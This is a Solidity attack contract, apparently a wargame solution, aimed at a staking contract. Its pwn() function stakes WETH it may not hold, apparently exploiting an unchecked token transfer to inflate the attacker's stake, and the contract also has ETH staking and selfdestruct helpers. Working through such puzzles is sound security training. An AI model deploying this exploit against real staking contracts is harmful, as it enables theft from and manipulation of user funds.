// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IStake {

    function totalStaked() external view returns (uint256);
    function UserStake(address _addr) external view returns (uint256);
    function Stakers(address _addr) external view returns (bool);
    function WETH() external view returns (address);
    
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    
}

interface IWeth {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract StakeAttack2 is Ownable {

    IStake public target;
    IWeth public weth;

    constructor(address _owner, address _target, address _weth) payable Ownable(_owner){
        target = IStake(_target);
        weth = IWeth(_weth);
    }

    function setTarget(address _adr) public onlyOwner {
        target = IStake(_adr);
    }

    function pwn() public onlyOwner {
        weth.approve(address(target), type(uint256).max);
        target.StakeWETH(1 ether);
    }

    //forgotthis
    function stakeRealETH() public payable onlyOwner {
        target.StakeETH{value: msg.value}();
    }

    function kill() public onlyOwner {
        selfdestruct(payable(owner()));
    }
}

